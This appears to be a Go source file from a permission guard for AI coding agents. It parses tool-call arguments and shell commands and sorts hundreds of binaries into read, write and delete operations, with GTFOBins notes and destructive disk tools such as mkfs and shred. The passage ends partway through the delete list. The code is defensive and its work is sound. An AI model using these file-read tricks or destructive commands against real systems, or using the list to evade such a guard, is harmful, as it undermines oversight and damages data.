package rules

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"io/fs"
	"maps"
	"net/netip"
	"net/url"
	"os"
	"path"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"
	"time"

	"mvdan.cc/sh/v3/expand"
	"mvdan.cc/sh/v3/interp"
	"mvdan.cc/sh/v3/syntax"
)

// ExtractedInfo contains paths and operation from a tool call
type ExtractedInfo struct {
	Operation     Operation
	Paths         []string
	Hosts         []string
	Command       string // Raw command string (for Bash tool)
	Content       string // Content being written (for Write/Edit tools); may be overwritten by extractors
	RawJSON       string // Full re-marshaled JSON of all args (never overwritten by extractors)
	RawArgs       map[string]any
	Evasive       bool   // true if command uses shell tricks that prevent static analysis
	EvasiveReason string // human-readable reason for evasion detection
}

// parsedCommand represents a single command extracted from a shell AST.
type parsedCommand struct {
	Name         string   `json:"name"`
	Args         []string `json:"args"`
	HasSubst     bool     `json:"has_subst"`      // true if any arg contains $() or backticks
	RedirPaths   []string `json:"redir_paths"`    // paths from output redirections (>, >>)
	RedirInPaths []string `json:"redir_in_paths"` // paths from input redirections (<)
}

// normalizeFieldName produces a canonical form for argument field names.
// It lowercases and strips underscores/hyphens so that "target_file" (Cursor),
// "TargetFile" (Windsurf PascalCase), and "targetfile" all match the same entry.
// This is applied both to incoming JSON keys and to entries in the known-field lists.
func normalizeFieldName(name string) string {
	return strings.NewReplacer("_", "", "-", "").Replace(strings.ToLower(name))
}

// knownPathFields lists argument field names that typically contain file paths.
// All entries are in normalized form (lowercase, no underscores/hyphens).
// Covers Claude Code, OpenClaw, Cursor, and Windsurf Cascade.
var knownPathFields = []string{
	"path", "filepath", "filename", "file",
	"source", "destination", "target",
	"targetfile",            // Cursor target_file / Windsurf TargetFile
	"relativeworkspacepath", // Cursor relative_workspace_path
	"absolutepath",          // Windsurf AbsolutePath
	"projectpath",           // Windsurf ProjectPath
	"searchdirectory",       // Windsurf SearchDirectory
	"directorypath",         // Windsurf DirectoryPath
	"searchpath",            // Windsurf SearchPath
}

// knownContentFields lists argument field names that typically contain file content.
// All entries are in normalized form (lowercase, no underscores/hyphens).
// Covers Claude Code, OpenClaw, Cursor, and Windsurf Cascade.
var knownContentFields = []string{
	"content", "newstring",
	"codeedit",     // Cursor code_edit / Windsurf CodeEdit
	"instructions", // Cursor
	"instruction",  // Windsurf
	"codecontent",  // Windsurf CodeContent
	// NOTE: "text" and "data" intentionally excluded — too generic (search queries,
	// API responses). Combined with a path field, they falsely infer OpWrite.
}

// knownURLFields lists argument field names that typically contain URLs.
// All entries are in normalized form (lowercase, no underscores/hyphens).
var knownURLFields = []string{
	"url", "uri", "endpoint", "baseurl", "apiurl",
	"serverurl", "webhook", "callbackurl", "redirecturl",
}

// knownCommandFields lists argument field names that typically contain shell commands.
// All entries are in normalized form (lowercase, no underscores/hyphens).
var knownCommandFields = []string{
	"command",      // Claude Code Bash, OpenClaw exec
	"cmd",          // common abbreviation
	"commandline",  // Windsurf CommandLine
	"script",       // script execution tools
	"shellcommand", // explicit shell tools
	"shell",        // generic shell field
	// NOTE: "input" intentionally excluded — too generic (translations, search, chat).
	// Non-shell text that fails AST parsing triggers Evasive=true → hard block.
}

// fieldStrings extracts all string values from a field value.
// Handles string, []any (from JSON arrays or case-collision merging),
// and silently ignores non-string types (numbers, objects, bools).
// This is the single point of type normalization — all extraction
// functions use this instead of inline type assertions.
func fieldStrings(val any) []string {
	switch v := val.(type) {
	case string:
		if v != "" {
			return []string{v}
		}
	case []any:
		var result []string
		for _, item := range v {
			if s, ok := item.(string); ok && s != "" {
				result = append(result, s)
			}
		}
		return result
	}
	return nil
}

// Extractor extracts paths and operations from tool calls
type Extractor struct {
	commandDB map[string]CommandInfo
	env       map[string]string // process environment for shell expansion
	worker    *shellWorker      // nil if subprocess isolation is disabled
}

// EnableSubprocessIsolation starts a worker subprocess for crash-isolated
// shell interpretation. If the interpreter panics in a goroutine spawned
// by the mvdan.cc/sh library, the subprocess crashes instead of the main
// process. Falls back to in-process interpretation if the worker dies.
func (e *Extractor) EnableSubprocessIsolation(exePath string) error {
	w, err := newShellWorker(exePath)
	if err != nil {
		return err
	}
	e.worker = w
	return nil
}

// Close cleans up resources. Call when the Extractor is no longer needed.
func (e *Extractor) Close() {
	if e.worker != nil {
		e.worker.stop()
		e.worker = nil
	}
}

// CommandInfo describes how to extract info from a command
type CommandInfo struct {
	Operation    Operation
	PathArgIndex []int    // positional args that are paths
	PathFlags    []string // flags followed by paths (-o, --output)
	SkipFlags    []string // flags followed by non-path values (-n, --count)
}

// NewExtractor creates a new Extractor with the default command database
// and the current process environment for shell variable expansion.
func NewExtractor() *Extractor {
	env := make(map[string]string)
	for _, e := range os.Environ() {
		if key, value, ok := strings.Cut(e, "="); ok {
			env[key] = value
		}
	}
	return &Extractor{
		commandDB: defaultCommandDB(),
		env:       env,
	}
}

// NewExtractorWithEnv creates an Extractor with a custom environment.
// Useful for testing with deterministic variable values.
func NewExtractorWithEnv(env map[string]string) *Extractor {
	if env == nil {
		env = make(map[string]string)
	}
	return &Extractor{
		commandDB: defaultCommandDB(),
		env:       env,
	}
}

// defaultCommandDB returns the default command database
func defaultCommandDB() map[string]CommandInfo {
	return map[string]CommandInfo{
		// ===========================================
		// READ OPERATIONS
		// ===========================================
		"cat":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}},
		"head": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-n", "--lines", "-c", "--bytes"}},
		"tail": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-n", "--lines", "-c", "--bytes"}},
		"less": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"more": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"grep": {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5, 6, 7, 8, 9}, SkipFlags: []string{"-e", "--regexp", "-m", "--max-count", "-A", "-B", "-C", "--context"}},
		"vim":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"vi":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"nano": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"view": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},

		// Binary inspection tools
		"strings": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"xxd":     {Operation: OpRead, PathArgIndex: []int{0}},
		"od":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"hexdump": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"hd":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2}}, // hexdump -C alias
		"base64":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"base32":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"file":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"stat":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"readelf": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"objdump": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"nm":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"ldd":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"size":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},

		// Encoding tools (GTFOBins: file-read)
		"uuencode": {Operation: OpRead, PathArgIndex: []int{0}},
		"uudecode": {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-o"}},
		"iconv":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, SkipFlags: []string{"-f", "--from-code", "-t", "--to-code", "-o", "--output"}},

		// Hashing/checksum tools (must read file to compute hash)
		"md5sum":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"md5":       {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}}, // macOS
		"sha1sum":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"sha224sum": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"sha256sum": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"sha384sum": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"sha512sum": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"shasum":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-a", "--algorithm"}},
		"cksum":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"sum":       {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"b2sum":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},

		// Text processing (read)
		"awk":   {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
		"gawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
		"mawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
		"nawk":  {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}},
		"sed":   {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5}}, // -i becomes write but still reads first
		"cut":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"sort":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"uniq":  {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"wc":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"diff":  {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"sdiff": {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"diff3": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"cmp":   {Operation: OpRead, PathArgIndex: []int{0, 1}, SkipFlags: []string{"-n", "--bytes"}},
		"shuf":  {Operation: OpRead, PathArgIndex: []int{0}, SkipFlags: []string{"-i", "-n", "--input-range", "--head-count", "-o", "--output"}},
		"split": {Operation: OpRead, PathArgIndex: []int{0}, SkipFlags: []string{"-n", "--number", "-l", "--lines", "-b", "--bytes", "-a", "--suffix-length"}},
		"tsort": {Operation: OpRead, PathArgIndex: []int{0}},

		// Grep variants
		"egrep": {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5, 6, 7, 8, 9}, SkipFlags: []string{"-e", "--regexp", "-m", "--max-count", "-A", "-B", "-C", "--context"}},
		"fgrep": {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5, 6, 7, 8, 9}, SkipFlags: []string{"-e", "--regexp", "-m", "--max-count", "-A", "-B", "-C", "--context"}},
		"rg":    {Operation: OpRead, PathArgIndex: []int{1, 2, 3, 4, 5, 6, 7, 8, 9}, SkipFlags: []string{"-e", "--regexp", "-m", "--max-count", "-A", "-B", "-C", "--context", "-t", "--type", "-g", "--glob"}},

		// Editors (GTFOBins: file-read)
		"ed":    {Operation: OpRead, PathArgIndex: []int{0}},
		"ex":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"emacs": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"rview": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"rvim":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"pico":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},

		// Pagers / display tools
		"pg":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"ul":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"bat":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"batcat": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3, 4, 5}}, // Debian package name

		// Additional text tools (read)
		"tac":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"toc":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"rev":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"nl":       {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"paste":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"join":     {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"comm":     {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"column":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"pr":       {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"fold":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"fmt":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"expand":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"unexpand": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"look":     {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"csplit":   {Operation: OpRead, PathArgIndex: []int{0}},
		"pv":       {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}}, // pipe viewer

		// Structured data tools (read)
		"jq":      {Operation: OpRead, PathArgIndex: []int{1, 2, 3}},
		"yq":      {Operation: OpRead, PathArgIndex: []int{1, 2, 3}},
		"openssl": {Operation: OpRead, PathFlags: []string{"-in", "-out"}},
		"sqlite3": {Operation: OpRead, PathArgIndex: []int{0}},
		"csvtool": {Operation: OpRead, PathArgIndex: []int{1, 2, 3}},
		"mysql":   {Operation: OpRead, PathArgIndex: []int{0}, SkipFlags: []string{"-u", "--user", "-p", "--password", "-h", "--host", "-P", "--port", "-D", "--database"}},
		"psql":    {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-f", "--file"}, SkipFlags: []string{"-U", "--username", "-h", "--host", "-p", "--port", "-d", "--dbname"}},

		// Document formatting / typesetting (GTFOBins: file-read)
		"nroff":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"groff":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"troff":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"pandoc":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o", "--output"}},
		"enscript": {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o", "--output"}},
		"a2ps":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o", "--output"}},

		// Archive tools (read contents)
		"tar":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-f", "--file"}},
		"zip":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"unzip":   {Operation: OpRead, PathArgIndex: []int{0}},
		"gzip":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"gunzip":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"zcat":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"bzip2":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"bunzip2": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"bzcat":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"xz":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"xzcat":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"lzma":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"unlzma":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"lzcat":   {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"zstd":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"unzstd":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"zstdcat": {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"lz4":     {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"lz4cat":  {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"unlz4":   {Operation: OpRead, PathArgIndex: []int{0, 1}},
		"cpio":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-F", "--file", "-I", "-E"}},
		"ar":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2, 3}},
		"7z":      {Operation: OpRead, PathArgIndex: []int{1, 2, 3}},
		"7za":     {Operation: OpRead, PathArgIndex: []int{1, 2, 3}},

		// ===========================================
		// WRITE OPERATIONS
		// ===========================================
		"tee":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"touch":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"install":  {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-m", "--mode", "-o", "--owner", "-g", "--group"}},
		"mkdir":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"sponge":   {Operation: OpWrite, PathArgIndex: []int{0}},
		"truncate": {Operation: OpWrite, PathArgIndex: []int{0, 1}, SkipFlags: []string{"-s", "--size"}},
		"patch":    {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-i", "--input", "-o", "--output"}},
		"chmod":    {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}}, // arg0 = mode
		"chown":    {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}}, // arg0 = owner[:group]
		"chgrp":    {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}}, // arg0 = group

		// Compiler / build tools
		"gcc":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o"}},
		"g++":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o"}},
		"cc":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o"}},
		"c++":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o"}},
		"clang":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o"}},
		"clang++": {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-o"}},
		"rustc":   {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-o"}},
		"javac":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-d"}},
		"as":      {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-o"}},
		"ld":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o"}},
		"strip":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"ranlib":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"cmake":   {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-S", "-B", "--build"}},
		"ninja":   {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-C"}},
		"meson":   {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"go":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}, PathFlags: []string{"-o"}},
		"cargo":   {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},

		// Package managers
		"pip":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}, PathFlags: []string{"-t", "--target", "-r", "--requirement"}},
		"pip3":     {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}, PathFlags: []string{"-t", "--target", "-r", "--requirement"}},
		"npm":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"yarn":     {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"pnpm":     {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"gem":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"composer": {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"brew":     {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"apt":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"apt-get":  {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"dpkg":     {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-i", "--install"}},
		"rpm":      {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-i", "--install", "-U", "--upgrade"}},
		"snap":     {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"flatpak":  {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"pacman":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-U"}},
		"yum":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"dnf":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"apk":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"zypper":   {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"port":     {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"dotnet":   {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}, PathFlags: []string{"-o", "--output"}},
		"mvn":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"gradle":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},

		// Encryption / signing
		"gpg":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o", "--output"}},
		"gpg2":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o", "--output"}},
		"age":     {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-o", "--output"}},
		"signify": {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-s", "-p", "-m"}},

		// Image / media conversion
		"convert":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"magick":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"ffmpeg":      {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-i"}},
		"ffprobe":     {Operation: OpRead, PathArgIndex: []int{0}},
		"sox":         {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"lame":        {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"flac":        {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"optipng":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"pngcrush":    {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"jpegoptim":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"gifsicle":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o", "--output"}},
		"wkhtmltopdf": {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"weasyprint":  {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"exiftool":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},

		// GTFOBins file-write binaries
		"gdb":    {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-x", "--command", "--core"}},
		"screen": {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-L", "-Logfile"}},
		"tmux":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"script": {Operation: OpWrite, PathArgIndex: []int{0}},

		// Filesystem metadata modification
		"chattr":  {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}},
		"setfacl": {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}, SkipFlags: []string{"-m", "--modify", "-M", "--modify-file", "-x", "--remove", "-X", "--remove-file"}},
		"xattr":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"chflags": {Operation: OpWrite, PathArgIndex: []int{1, 2, 3, 4, 5}},

		// File creation / allocation
		"fallocate": {Operation: OpWrite, PathArgIndex: []int{0, 1}, SkipFlags: []string{"-l", "--length", "-o", "--offset"}},
		"mknod":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfifo":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"mktemp":    {Operation: OpWrite, PathFlags: []string{"-p", "--tmpdir"}},

		// Disk / filesystem / partition tools
		"mkfs":       {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.ext2":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.ext3":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.ext4":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.xfs":   {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.btrfs": {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.vfat":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkfs.ntfs":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"mke2fs":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"newfs":      {Operation: OpWrite, PathArgIndex: []int{0}},
		"mkswap":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"wipefs":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"fdisk":      {Operation: OpWrite, PathArgIndex: []int{0}},
		"gdisk":      {Operation: OpWrite, PathArgIndex: []int{0}},
		"sgdisk":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"parted":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"sfdisk":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"losetup":    {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"mount":      {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"umount":     {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"cryptsetup": {Operation: OpWrite, PathArgIndex: []int{1, 2}},
		"e2fsck":     {Operation: OpWrite, PathArgIndex: []int{0}},
		"fsck":       {Operation: OpWrite, PathArgIndex: []int{0}},
		"tune2fs":    {Operation: OpWrite, PathArgIndex: []int{0}},
		"resize2fs":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"xfs_repair": {Operation: OpWrite, PathArgIndex: []int{0}},
		"btrfs":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},

		// Archive creation tools
		"mksquashfs":  {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"mkisofs":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o"}},
		"genisoimage": {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o"}},
		"xorriso":     {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-outdev"}},
		"pax":         {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-f"}},

		// macOS-specific write tools
		"plutil":            {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"defaults":          {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"PlistBuddy":        {Operation: OpWrite, PathArgIndex: []int{0}},
		"hdiutil":           {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"diskutil":          {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"codesign":          {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"launchctl":         {Operation: OpWrite, PathArgIndex: []int{1, 2}},
		"scutil":            {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"installer":         {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-pkg", "-target"}},
		"lipo":              {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-output"}},
		"install_name_tool": {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"dscl":              {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}},
		"sips":              {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-o", "--out"}},
		"textutil":          {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-output"}},

		// systemd / service management
		"systemctl":   {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"hostnamectl": {Operation: OpWrite, PathArgIndex: []int{1, 2}},
		"journalctl":  {Operation: OpRead, PathArgIndex: []int{}},

		// User/group management
		"useradd":  {Operation: OpWrite, PathArgIndex: []int{0}, SkipFlags: []string{"-u", "--uid", "-g", "--gid", "-d", "--home", "-s", "--shell", "-c", "--comment"}},
		"usermod":  {Operation: OpWrite, PathArgIndex: []int{0}, SkipFlags: []string{"-u", "--uid", "-g", "--gid", "-d", "--home", "-s", "--shell", "-l", "--login"}},
		"groupadd": {Operation: OpWrite, PathArgIndex: []int{0}},
		"groupmod": {Operation: OpWrite, PathArgIndex: []int{0}},
		"passwd":   {Operation: OpWrite, PathArgIndex: []int{0}},
		"hardlink": {Operation: OpWrite, PathArgIndex: []int{0, 1}},

		// ===========================================
		// DELETE OPERATIONS
		// ===========================================
		"rm":        {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}},
		"unlink":    {Operation: OpDelete, PathArgIndex: []int{0}},
		"shred":     {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"rmdir":     {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"srm":       {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}}, // secure-delete
		"wipe":      {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
